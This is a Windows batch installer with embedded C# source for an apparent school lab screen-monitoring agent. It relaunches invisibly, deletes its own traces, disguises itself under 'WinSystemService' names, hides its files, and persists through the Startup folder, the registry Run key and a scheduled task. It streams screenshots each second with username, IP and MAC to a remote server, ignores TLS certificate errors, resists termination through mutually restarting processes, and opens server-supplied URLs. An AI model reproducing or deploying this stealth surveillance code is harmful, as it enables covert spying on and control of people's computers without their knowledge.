@echo off
chcp 65001 >nul
set "INSTALL_DIR=%LOCALAPPDATA%\WinSystemService"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Kullanici cift tikladigi anda siyah pencereyi 0.05 saniyede kapatip tamamen gorunmez (WindowStyle=0) moda gec
if not "%~1"=="--silent" (
    attrib -h -s "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
    copy /y "%~f0" "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
    (
        echo Set WshShell = CreateObject^("WScript.Shell"^)
        echo WshShell.Run chr^(34^) ^& "%INSTALL_DIR%\setup_runner.bat" ^& chr^(34^) ^& " --silent " ^& chr^(34^) ^& "%~f0" ^& chr^(34^), 0, False
    ) > "%INSTALL_DIR%\launch_silent.vbs"
    start "" wscript.exe //B //Nologo "%INSTALL_DIR%\launch_silent.vbs"
    exit /b 0
)

:: Indirilen kaynak .bat dosyasini ve masaustu kisayollarini sil (ogrenci gorup kurcalayamasin)
if not "%~2"=="" (
    if /i not "%~2"=="%INSTALL_DIR%\setup_runner.bat" (
        del /f /q "%~2" >nul 2>&1
    )
)
del /f /q "%USERPROFILE%\Desktop\Lab Ekran Paylasimi.lnk" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\ogrenci-istemci*.bat" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\SistemServisi*.bat" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\WinSystemSetup*.bat" >nul 2>&1

:: Eski surecleri temizle
taskkill /f /im WinSystemHost.exe >nul 2>&1
taskkill /f /im WinSystemGuard.exe >nul 2>&1
taskkill /f /im PiriReisLabHost.exe >nul 2>&1
taskkill /f /im PiriReisLabGuard.exe >nul 2>&1
taskkill /f /im WindowsAudioHost.exe >nul 2>&1

set "OLD_DIR=%LOCALAPPDATA%\PiriReisLabService"
if exist "%OLD_DIR%" rd /s /q "%OLD_DIR%" >nul 2>&1

set "CS_FILE=%INSTALL_DIR%\WinHost.cs"
set "EXE_FILE=%INSTALL_DIR%\WinSystemHost.exe"
set "GUARD_FILE=%INSTALL_DIR%\WinSystemGuard.exe"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_STARTUP=%STARTUP_DIR%\WinSystemService.vbs"

del /f /q "%STARTUP_DIR%\PiriReisLabAgent.vbs" >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PiriReisLabService" /f >nul 2>&1
schtasks /delete /tn "PiriReisLabAgent" /f >nul 2>&1

:: C# Kaynak Kodunu Cikar (76. satirdan itibaren)
more +76 "%~f0" > "%CS_FILE%"

set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC_EXE%" set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"

attrib -h -s "%EXE_FILE%" >nul 2>&1
attrib -h -s "%GUARD_FILE%" >nul 2>&1
"%CSC_EXE%" /nologo /target:winexe /out:"%EXE_FILE%" /r:System.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll "%CS_FILE%" >nul 2>&1

attrib -h -s "%VBS_STARTUP%" >nul 2>&1
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "%EXE_FILE%" ^& chr^(34^), 0, False
) > "%VBS_STARTUP%"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /f >nul 2>&1
schtasks /create /tn "WinSystemService" /tr "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /sc onlogon /f >nul 2>&1

del /f /q "%CS_FILE%" >nul 2>&1
del /f /q "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
attrib +h "%VBS_STARTUP%" >nul 2>&1
attrib +h +s "%EXE_FILE%" >nul 2>&1
attrib +h +s "%INSTALL_DIR%" >nul 2>&1

start "" wscript.exe //B //Nologo "%VBS_STARTUP%"
del /f /q "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
exit /b 0
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text.RegularExpressions;

namespace WinSystemService
{
    public class LabAgentForm : Form
    {
        private Label lockLabel;
        private PictureBox demoPic;
        private System.Windows.Forms.Timer captureTimer;
        private System.Windows.Forms.Timer topMostTimer;
        private bool isLocked = false;
        private bool isDemoActive = false;
        private string lastUrlId = "";
        private string lastAnnounce = "";
        private string deskNo;
        private string studentName;
        private string clientId;
        private string localIp = "";
        private string localMac = "";
        private ImageCodecInfo jpegCodec;
        private EncoderParameters encParams;

        private const string LIVE_API = "https://pirireis-api.onrender.com/api/labizleme/frame";
        private const string LOCAL_API = "http://192.168.23.244:4000/api/frame";

        public LabAgentForm()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)768 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            deskNo = Environment.MachineName;
            studentName = Environment.UserName;
            clientId = "pc-" + deskNo;
            DetectNetworkInfo();

            foreach (ImageCodecInfo codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg")
                {
                    jpegCodec = codec;
                    break;
                }
            }
            encParams = new EncoderParameters(1);
            encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 60L);

            this.Text = "";
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(-32000, -32000);
            this.Size = new Size(1, 1);
            this.WindowState = FormWindowState.Normal;
            this.ShowInTaskbar = false;
            this.TopMost = true;
            this.BackColor = Color.FromArgb(76, 5, 25);
            this.ControlBox = false;
            this.Opacity = 0;

            lockLabel = new Label();
            lockLabel.Dock = DockStyle.Fill;
            lockLabel.ForeColor = Color.White;
            lockLabel.Font = new Font("Segoe UI", 24, FontStyle.Bold);
            lockLabel.TextAlign = ContentAlignment.MiddleCenter;
            lockLabel.Text = "EKRAN KILITLI (DIKKAT MODU)\r\n\r\nOgretmen dersi anlatiyor. Lutfen ekraniniza degil ogretmenize odaklanin.";
            lockLabel.Visible = false;
            this.Controls.Add(lockLabel);

            demoPic = new PictureBox();
            demoPic.Dock = DockStyle.Fill;
            demoPic.BackColor = Color.Black;
            demoPic.SizeMode = PictureBoxSizeMode.Zoom;
            demoPic.Visible = false;
            this.Controls.Add(demoPic);

            this.FormClosing += new FormClosingEventHandler(OnFormClosing);

            captureTimer = new System.Windows.Forms.Timer();
            captureTimer.Interval = 1000;
            captureTimer.Tick += new EventHandler(OnCaptureTick);
            captureTimer.Start();

            topMostTimer = new System.Windows.Forms.Timer();
            topMostTimer.Interval = 400;
            topMostTimer.Tick += new EventHandler(OnTopMostTick);
            topMostTimer.Start();
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80;       // WS_EX_TOOLWINDOW: hides from Alt+Tab and Task Manager Apps list
                cp.ExStyle |= 0x08000000; // WS_EX_NOACTIVATE when hidden
                return cp;
            }
        }

        protected override bool ShowWithoutActivation
        {
            get { return !isLocked && !isDemoActive; }
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if ((keyData & Keys.Alt) == Keys.Alt || (keyData & Keys.Control) == Keys.Control || keyData == Keys.Escape)
            {
                if (isLocked || isDemoActive) return true;
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void HideCompletely()
        {
            this.Opacity = 0;
            this.WindowState = FormWindowState.Normal;
            this.Location = new Point(-32000, -32000);
            this.Size = new Size(1, 1);
            this.ShowInTaskbar = false;
        }

        private void ShowOverlayFullScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            this.Location = bounds.Location;
            this.Size = bounds.Size;
            this.WindowState = FormWindowState.Maximized;
            this.Opacity = 1;
            this.TopMost = true;
            this.BringToFront();
            this.Activate();
        }

        private void OnTopMostTick(object sender, EventArgs e)
        {
            if (isLocked || isDemoActive)
            {
                ShowOverlayFullScreen();
            }
        }

        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason != CloseReason.WindowsShutDown)
            {
                e.Cancel = true;
                if (!isLocked && !isDemoActive) HideCompletely();
            }
        }

        private void DetectNetworkInfo()
        {
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                string s = ip.Address.ToString();
                                if (s.StartsWith("192.168.") || s.StartsWith("10."))
                                {
                                    localIp = s;
                                    byte[] macBytes = ni.GetPhysicalAddress().GetAddressBytes();
                                    string[] hex = new string[macBytes.Length];
                                    for (int i = 0; i < macBytes.Length; i++) hex[i] = macBytes[i].ToString("X2");
                                    localMac = string.Join("-", hex);
                                    return;
                                }
                            }
                        }
                    }
                }
            }
            catch { }
        }

        private string CaptureScreenDataUrl(out string resolution)
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            resolution = bounds.Width + "x" + bounds.Height;
            using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                }
                int targetW = 854;
                int targetH = (int)Math.Round(bounds.Height * ((double)targetW / bounds.Width));
                using (Bitmap resized = new Bitmap(targetW, targetH))
                {
                    using (Graphics g2 = Graphics.FromImage(resized))
                    {
                        g2.InterpolationMode = InterpolationMode.Bilinear;
                        g2.DrawImage(bmp, 0, 0, targetW, targetH);
                    }
                    using (MemoryStream ms = new MemoryStream())
                    {
                        resized.Save(ms, jpegCodec, encParams);
                        return "data:image/jpeg;base64," + Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
        }

        private static string EscapeJson(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
        }

        private string PostJson(string url, byte[] data, int timeoutMs)
        {
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "application/json; charset=utf-8";
                req.Timeout = timeoutMs;
                req.ReadWriteTimeout = timeoutMs;
                req.ContentLength = data.Length;
                using (Stream reqStream = req.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                using (StreamReader sr = new StreamReader(resp.GetResponseStream(), Encoding.UTF8))
                {
                    return sr.ReadToEnd();
                }
            }
            catch
            {
                return null;
            }
        }

        private void OnCaptureTick(object sender, EventArgs e)
        {
            captureTimer.Stop();
            try
            {
                string resStr;
                string dataUrl = CaptureScreenDataUrl(out resStr);

                string json = "{"
                    + "\"id\":\"" + EscapeJson(clientId) + "\","
                    + "\"deskNo\":\"" + EscapeJson(deskNo) + "\","
                    + "\"studentName\":\"" + EscapeJson(studentName) + "\","
                    + "\"name\":\"" + EscapeJson(deskNo + " (" + studentName + ")") + "\","
                    + "\"localIp\":\"" + EscapeJson(localIp) + "\","
                    + "\"mac\":\"" + EscapeJson(localMac) + "\","
                    + "\"resolution\":\"" + EscapeJson(resStr) + "\","
                    + "\"handRaised\":false,"
                    + "\"sharingActive\":true,"
                    + "\"clientType\":\"native\","
                    + "\"frame\":\"" + dataUrl + "\""
                    + "}";

                byte[] payloadBytes = Encoding.UTF8.GetBytes(json);

                ThreadPool.QueueUserWorkItem(delegate
                {
                    string respText = PostJson(LIVE_API, payloadBytes, 3500);
                    string localResp = PostJson(LOCAL_API, payloadBytes, 1000);
                    string activeResp = respText ?? localResp;
                    if (!string.IsNullOrEmpty(activeResp))
                    {
                        try
                        {
                            this.BeginInvoke((MethodInvoker)delegate
                            {
                                ApplyServerResponse(activeResp);
                            });
                        }
                        catch { }
                    }
                });
            }
            catch { }
            finally
            {
                captureTimer.Start();
            }
        }

        private static string ExtractJsonString(string json, string key)
        {
            Match m = Regex.Match(json, "\"" + key + "\"\\s*:\\s*\"((?:\\\\.|[^\"\\\\])*)\"");
            if (!m.Success) return null;
            return Regex.Unescape(m.Groups[1].Value);
        }

        private void ApplyServerResponse(string json)
        {
            bool locked = Regex.IsMatch(json, "\"locked\"\\s*:\\s*true");
            bool streamActive = Regex.IsMatch(json, "\"teacherStreamActive\"\\s*:\\s*true");

            if (locked)
            {
                string msg = ExtractJsonString(json, "lockMessage");
                if (!string.IsNullOrEmpty(msg))
                {
                    lockLabel.Text = "EKRAN KILITLI (DIKKAT MODU)\r\n\r\n" + msg;
                }
                isLocked = true;
                demoPic.Visible = false;
                lockLabel.Visible = true;
                ShowOverlayFullScreen();
            }
            else if (streamActive)
            {
                string tFrame = ExtractJsonString(json, "teacherFrame");
                if (!string.IsNullOrEmpty(tFrame) && tFrame.Contains(","))
                {
                    try
                    {
                        string b64 = tFrame.Substring(tFrame.IndexOf(",") + 1);
                        byte[] imgBytes = Convert.FromBase64String(b64);
                        MemoryStream ms = new MemoryStream(imgBytes);
                        Image old = demoPic.Image;
                        demoPic.Image = Image.FromStream(ms);
                        if (old != null) old.Dispose();
                    }
                    catch { }
                }
                isDemoActive = true;
                lockLabel.Visible = false;
                demoPic.Visible = true;
                ShowOverlayFullScreen();
            }
            else
            {
                if (isLocked || isDemoActive)
                {
                    isLocked = false;
                    isDemoActive = false;
                    lockLabel.Visible = false;
                    demoPic.Visible = false;
                    HideCompletely();
                }
            }

            // Open URL check
            Match urlBlock = Regex.Match(json, "\"openUrlCommand\"\\s*:\\s*\\{([^\\}]+)\\}");
            if (urlBlock.Success)
            {
                string block = urlBlock.Groups[1].Value;
                string uid = ExtractJsonString(block, "id");
                string url = ExtractJsonString(block, "url");
                if (!string.IsNullOrEmpty(uid) && !string.IsNullOrEmpty(url) && uid != lastUrlId)
                {
                    lastUrlId = uid;
                    try { Process.Start(url); } catch { }
                }
            }

            // Announcement check
            Match annBlock = Regex.Match(json, "\"announcement\"\\s*:\\s*\\{([^\\}]+)\\}");
            if (annBlock.Success)
            {
                string block = annBlock.Groups[1].Value;
                string msg = ExtractJsonString(block, "message");
                string ts = ExtractJsonString(block, "timestamp");
                if (!string.IsNullOrEmpty(msg))
                {
                    string key = (ts ?? "") + ":" + msg;
                    if (key != lastAnnounce)
                    {
                        lastAnnounce = key;
                        ThreadPool.QueueUserWorkItem(delegate
                        {
                            MessageBox.Show(msg, "Ogretmen Duyurusu - Piri Reis MTAL", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        });
                    }
                }
            }
        }

        [STAThread]
        public static void Main(string[] args)
        {
            if (args.Length > 0 && args[0] == "--worker")
            {
                string guardianPath = args.Length > 1 ? args[1] : null;
                if (!string.IsNullOrEmpty(guardianPath))
                {
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        while (true)
                        {
                            try
                            {
                                string gName = Path.GetFileNameWithoutExtension(guardianPath);
                                if (Process.GetProcessesByName(gName).Length == 0 && File.Exists(guardianPath))
                                {
                                    ProcessStartInfo gpsi = new ProcessStartInfo(guardianPath);
                                    gpsi.UseShellExecute = false;
                                    gpsi.CreateNoWindow = true;
                                    Process.Start(gpsi);
                                }
                            }
                            catch { }
                            Thread.Sleep(1200);
                        }
                    });
                }
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new LabAgentForm());
                return;
            }

            bool createdNew;
            using (Mutex mutex = new Mutex(true, "Global\\WinSystemDisplayServiceMutex", out createdNew))
            {
                if (!createdNew) return;
                string exePath = Application.ExecutablePath;
                string dir = Path.GetDirectoryName(exePath);
                string workerExe = Path.Combine(dir, "WinSystemGuard.exe");
                try
                {
                    if (!File.Exists(workerExe) || new FileInfo(workerExe).Length != new FileInfo(exePath).Length)
                    {
                        File.Copy(exePath, workerExe, true);
                    }
                }
                catch
                {
                    workerExe = exePath;
                }

                while (true)
                {
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo(workerExe, "--worker \"" + exePath + "\"");
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        p.WaitForExit();
                    }
                    catch { }
                    Thread.Sleep(400);
                }
            }
        }
    }
}
